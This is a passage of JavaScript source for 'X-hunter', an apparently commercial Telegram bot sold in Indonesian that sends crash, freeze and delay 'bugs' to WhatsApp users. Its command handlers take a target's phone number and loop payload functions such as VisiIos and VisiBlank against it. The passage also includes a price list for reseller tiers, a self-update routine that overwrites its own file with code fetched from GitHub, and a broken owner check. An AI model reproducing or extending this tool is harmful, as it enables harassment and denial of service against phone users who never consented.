✘ 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙩𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 : ${formatDate(expired)}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
    { parse_mode: "HTML" }
  );
});

// ================================
// COMMAND: BLOCK COMMAND
// /blockcmd
// ================================
bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /blockcmd namacommand");
  }

  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) {
    return ctx.reply("❌ Command ini tidak bisa diblokir.");
  }

  if (blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  }

  blockedCommands.push(commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /unblockcmd namacommand");
  }

  if (!blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  }

  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  if (blockedCommands.length === 0) {
    return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  }

  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");

  return ctx.reply(
    `📋 Daftar command yang diblokir:\n\n${list}`
  );
});

//---------(HANDLER BLOCK CMD ) ---------//
const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");

let blockedCommands = [];

function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const raw = fs.readFileSync(BLOCKCMD_FILE, "utf8");
      const parsed = JSON.parse(raw);

      if (Array.isArray(parsed)) {
        blockedCommands = parsed.map(cmd => String(cmd).toLowerCase().trim());
      } else {
        blockedCommands = [];
      }
    } else {
      blockedCommands = [];
    }
  } catch (err) {
    console.error("Gagal load blocked commands:", err.message);
    blockedCommands = [];
  }
}

function saveBlockedCommands() {
  try {
    fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2));
  } catch (err) {
    console.error("Gagal save blocked commands:", err.message);
  }
}

function normalizeCommandName(input) {
  return String(input || "")
    .trim()
    .toLowerCase()
    .replace(/^\//, "");
}

function isCommandBlocked(commandName) {
  const normalized = normalizeCommandName(commandName);
  return blockedCommands.includes(normalized);
}

loadBlockedCommands();

//---------(MIDDLEWARE BLOCK CMD ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) {
    return next();
  }

  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);

  // command manajemen block jangan ikut diblok oleh middleware ini
  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];

  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }

  return next();
});
// ------ ( Thumbnail Foto Menu ) ------ //
const FotoUtama = "https://files.catbox.moe/72x7e3.jpg";

let groupOnly = true // default aktif (langsung block private)

// =================
// Middleware (AUTO FILTER)
// =================
bot.use((ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()

  const text = ctx.message.text
  if (!text.startsWith('/')) return next()

  const isPrivate = ctx.chat.type === 'private'
  const cmd = text.split(' ')[0].replace('/', '').toLowerCase()

  // =========================
  // 🔒 GROUP ONLY (NO BYPASS)
  // =========================
  if (groupOnly && isPrivate) {
    return ctx.reply('❌ Mode Group Only aktif\nGunakan command di group')
  }

  // =========================
  // OWNER CHECK (HANYA UNTUK CONTROL)
  // =========================
  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

  if (cmd === 'grouponly' && !isOwner) {
    return ctx.reply('❌ Hanya Owner yang bisa mengakses cmd')
  }

  return next()
})

let forceChannel = null
let channelOn = false

// =================
// Helper
// =================
function isOwner(ctx) {
  return ID_TELEGRAM || isAdmin(userId);
}

// =================
// Middleware (AUTO CEK JOIN)
// =================
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()

  const text = ctx.message.text
  if (!text.startsWith('/')) return next()

  // Skip kalau belum aktif / belum set channel
  if (!channelOn || !forceChannel) return next()

  try {
    const member = await ctx.telegram.getChatMember(forceChannel, ctx.from.id)

    const status = member.status
    if (status === 'left' || status === 'kicked') {
      return ctx.reply(
        `❌ Anda harus join channel dulu!\n\n👉 ${forceChannel}`
      )
    }

  } catch (e) {
    return ctx.reply('⚠️ Bot tidak bisa cek channel (pastikan bot admin)')
  }

  return next()
})

// ------ ( Menu Utama + Button Disko ) ------ //
const styles = ["Primary", "Success", "Danger"];
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedMainKeyboard() {
    const style = styles[styleIndex];

    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;

    return [
        [
            { text: "ꜱᴇᴛᴛɪɴɢꜱ", callback_data: "/owner_menu", style },
            { text: "ᴛᴏᴏʟꜱ", callback_data: "/tools_menu", style },
            { text: "ʙᴜɢꜱ", callback_data: "/bug_menu", style }
        ],
        [
            { text: "ᴛʜᴀɴᴋꜱ ᴛᴏ", callback_data: "/fadzx_menu", style },
            { text: "ʜᴀʀɢᴀ ꜱᴄʀɪᴘᴛ", callback_data: "/harga_menu", style },
            { text: "ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ", callback_data: "/info_menu", style },
       ],
       [
            { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "t.me/Fadzzid", style }
        ]
    ];
}

function stopMenuAnimation() {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }
}

// ------ ( Menu Utama ) ------ //
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const premiumStatus = getPremiumStatus(ctx.from.id);
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Belum Terhubung";
    const runTime = runtime(process.uptime());
    const menuMessage = `
<blockquote><tg-emoji emoji-id="5411466090662359206">🥀</tg-emoji> 〔 𝑋-ℎ𝑢𝑛𝑡𝑒𝑟 〕
𝚡-𝚑𝚞𝚗𝚝𝚎𝚛 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Fadzzid 
<tg-emoji emoji-id="4956648660541637813">🪩</tg-emoji> sʏsᴛᴇᴍ : Auto-Update
<tg-emoji emoji-id="5323811602061889129">🌑</tg-emoji> ᴠᴇʀsɪᴏɴ : 15.7
<tg-emoji emoji-id="5326065523589416704">🔫</tg-emoji> sᴛᴀᴛᴜs : Premium Verified ✅</blockquote>
<blockquote>〔 Informasi Bot 〕
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}
<tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${runTime}
<tg-emoji emoji-id="4904848288345228262">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : @${ctx.from.username || "Tidak Ada"}
<tg-emoji emoji-id="6206497372176913599">🔗</tg-emoji> ᴜsᴇʀ ɪᴅ : ${userId}</blockquote>
`;
    try {
        stopMenuAnimation();

        const sentMsg = await ctx.replyWithPhoto(FotoUtama, {
            caption: menuMessage,
                parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: getAnimatedMainKeyboard()
            }
        });

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    sentMsg.message_id,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);
    } catch (error) {
        console.error("Error saat mengirim menu utama:", error);
    }
});

// ------ ( Callback Menu Utama ) ------ //
bot.action("/start", async (ctx) => {
    const userId = ctx.from.id;
    const premiumStatus = getPremiumStatus(ctx.from.id);
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Belum Terhubung";
    const runTime = runtime(process.uptime());
    const menuMessage = `
<blockquote><tg-emoji emoji-id="5411466090662359206">🥀</tg-emoji> 〔 𝑋-ℎ𝑢𝑛𝑡𝑒𝑟 〕
𝚡-𝚑𝚞𝚗𝚝𝚎𝚛 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Fadzzid 
<tg-emoji emoji-id="4956648660541637813">🪩</tg-emoji> sʏsᴛᴇᴍ : Auto-Update
<tg-emoji emoji-id="5323811602061889129">🌑</tg-emoji> ᴠᴇʀsɪᴏɴ : 15.7
<tg-emoji emoji-id="5326065523589416704">🔫</tg-emoji> sᴛᴀᴛᴜs : Premium Verified ✅</blockquote>
<blockquote>〔 Information Bot 〕
━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}
<tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${runTime}
<tg-emoji emoji-id="4904848288345228262">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : @${ctx.from.username || "Tidak Ada"}
<tg-emoji emoji-id="6206497372176913599">🔗</tg-emoji> ᴜsᴇʀ ɪᴅ : ${userId}</blockquote>
`;

    try {
        stopMenuAnimation();

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: FotoUtama,
                caption: menuMessage,
                parse_mode: "HTML"
            },
            {
                reply_markup: {
                    inline_keyboard: getAnimatedMainKeyboard()
                }
            }
        );

        const messageId = ctx.callbackQuery.message.message_id;

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    messageId,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);

        await ctx.answerCbQuery();
    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Bug Menu ) ------ //
bot.action('/bug_menu', async (ctx) => {
    stopMenuAnimation(); 
    const bug_menuMenu = `
<blockquote>╭╴⟬ <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> MURBUG • VVVIP ACCESS <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> ⟭╶╮

<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> <tg-emoji emoji-id="5474141032289441762">📱</tg-emoji> Android • Delay Invisible ✅ can spam
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /xbugs      <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /xkill      <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /xynerx     <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /xcokoz     <tg-emoji emoji-id="5228740817337727023">💡</tg-emoji> 628xxxx
────────────────────────────
<tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> Tips:
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /unblockcmd /command → menghidupkan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /blockcmd /command → mematikan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addbot →menambahkan sender
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /killsesi → menghapus sender 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /listblockcmd → menampilkan semua command 
╰────────────────────────────</blockquote>
`;

    const keyboard = [
        [
            { text: "ɴᴇxᴛ", callback_data: "/visible_bug" },
        ],
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Bug Menu ) ------ //
bot.action('/visible_bug', async (ctx) => {
    stopMenuAnimation(); 
    const visible_bugMenu = `
<blockquote>╭╴⟬ <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> XBUGS • VVVIP ACCESS <tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> ⟭╶╮

<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji><tg-emoji emoji-id="5474141032289441762">📱</tg-emoji> Device • Bug Andro X Ios         not spam
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /Ioscrash     <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> forclose ios new
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /Blank      <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> blank andro new
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /Delay      <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> delay whatsapp new
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /HunterX         <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> forclose andro new 
│ <tg-emoji emoji-id="6035353718684129368">🔄</tg-emoji> /Frezze     <tg-emoji emoji-id="5787429669280157600">➡️</tg-emoji> frezze whatsapp new
────────────────────────────
<tg-emoji emoji-id="4956259055468282692">💫</tg-emoji> Tips:
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /unblockcmd /command → menghidupkan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /blockcmd /command → mematikan command
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addbot →menambahkan sender
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /killsesi → menghapus sender 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /listblockcmd → menampilkan semua command 
╰────────────────────────────</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(visible_bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di visible_bug:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Owner Menu ) ------ //
bot.action('/owner_menu', async (ctx) => {
    stopMenuAnimation(); 
    const owner_menuMenu = `
<blockquote>#- 𝘚 𝘌 𝘛 𝘛 𝘐 𝘕 𝘎  𝘖 𝘞 𝘕 𝘌 𝘙  -  𝘔 𝘌 𝘕 𝘜

"一緒 Setting Menu X-hunter ᯤ",
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /blockcmd /cmd - [MENGUNCI CMD BUGS]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /unblockcmd /cmd/ - [MEMBUKA KUNCI CMD BUGS]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /listblockcmd - [LIST ALL CMD YANG DI KUNCI]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /grouponly on/off - [UNTUK MENJAGA AGAR TIDAK ADA YANG CHAT DI PRIVATE BOT]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addbot - [ADD SENDER]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /killsesi - [HAPUS SENDER]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /setchannel - [SET CHANNEL KALIAN COCOK BUAT PHUS CH]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /channel on/off - [MENGAKTIFKAN SET CHANNEL]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addadmin - [MENAMBAH ADMIN]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /deladmin - [MENGHAPUS ADMIN]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /addprem - [MENAMBAHKAN PREMIUM USER]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /delprem - [MENGHAPUS PREMIUM USER]</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(owner_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di owner_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Tools Menu ) ------ //
bot.action('/tools_menu', async (ctx) => {
    stopMenuAnimation(); 
    const tools_menuMenu = `
<blockquote>#- 𝘛 𝘖 𝘖 𝘓 𝘚  -  𝘔 𝘌 𝘕 𝘜

"一緒 Tools Menu X-hunter ᯤ",
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /update - [UPDATE SCRIPT KE VERSION TERBARU]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /cekemoji - [CEK EMOJI PREMIUM]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /CheckError - [CEK EROR FILE.js]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /fixerror - [FIX EROR FILE.js]</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(tools_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tools_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Tangks To ) ------ //
bot.action('/fadzx_menu', async (ctx) => {
    stopMenuAnimation(); 
    const fadzx_menuMenu = `
<blockquote>〔 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 〕</blockquote>
<blockquote>♡ VanxxID.t.me ( friend )
♡ senzystur.t.me ( brother )
♡ HanXzyz.t.me ( friend mokondo )
♡ makloeyatiem.t.me ( friend )
♡ Tantan_Chan.t.me ( best friend )
♡ All buyer X-hunter
♡ All patner,owner,tk Fadzx</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(fadzx_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di fadzx_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Harga Script ) ------ //
bot.action('/harga_menu', async (ctx) => {
    stopMenuAnimation(); 
    const harga_menuMenu = `
<blockquote>╔════════════════════
║       ⧼ 𝐗-𝐇𝐔𝐍𝐓𝐄𝐑 ⧽
╠════════════════════
║ ⧼ 𝐋𝐈𝐒𝐓 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 ⧽
╠════════════════════
║⌬ FREE UPDATE: Rp 5.000/5K
║⌬ RESELLER: Rp 10.000/10K
║⌬ PARTNER: Rp 15.000/15K
║⌬ MODERATOR: Rp 20.000/20K
║⌬ CEO: Rp 25k.000/25K
║⌬ OWNER: Rp 30.000/30K
╠════════════════════
║⚠️NOTE: NO MERUSAK HARGA 
║SCRIPT SESUAI DENGAN
║HARGA NYA TERIMAKASIH‼️
╚═════════════════════</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(harga_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di harga_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Info Update ) ------ //
bot.action('/info_menu', async (ctx) => {
    stopMenuAnimation(); 
    const info_menuMenu = `
<blockquote>〔 𝗜𝗡𝗙𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 〕</blockquote>
<blockquote>1. NEW COMMAND /update
2. NEW TOOLS /cekemoji
3. NEW TOOLS /CheckError
4. NEW TOOLS /fixerror
5. FIX FUNC GA WORK

ALL BUG BEBAS SPAM ANTI KENON 80%
SARAN SET COOLDOWN 3 DETIK</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(info_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di info_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});
//------------------(AUTO - UPDATE SYSTEM)--------------------//
bot.command("update", async (ctx) => doUpdate(ctx));

// ✅ UPDATE URL DISINI AJA (GAK DIPISAH)
const UPDATE_URL =
  "https://github.com/prantirahayu80-star/tuanfadz/blob/main/main.js"; // GANTI RAW URL

// ✅ foto /start
const thumbnailUp = "https://files.catbox.moe/j8ci57.jpg"; // GANTI (boleh file_id juga)

// ✅ file yang mau ditimpa update (samain sama file yang dijalanin panel)
const UPDATE_FILE_PATH = "./main.js"; // GANTI kalau panel jalanin file lain

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu.", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply("✅ <b>Update berhasil!</b>\n♻ <i>Restarting bot...</i>", {
      parse_mode: "HTML",
    });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

// ------ ( Case Bug Menu ) ------ //
bot.command("Ioscrash", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Ioscrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Forclose Ios 
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await VisiIos(sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Forclose Ios
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Blank", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Blank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Blank Andro New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await VisiBlank(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Blank Andro New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Delay", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Delay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Delay WhatsApp New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
